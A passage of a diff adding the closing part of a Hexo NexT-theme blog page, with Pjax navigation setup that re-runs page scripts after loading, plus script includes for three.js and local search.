+    '.post-toc-wrap',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.getAttribute('pjax') !== null) {
+      script.setAttribute('pjax', '');
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
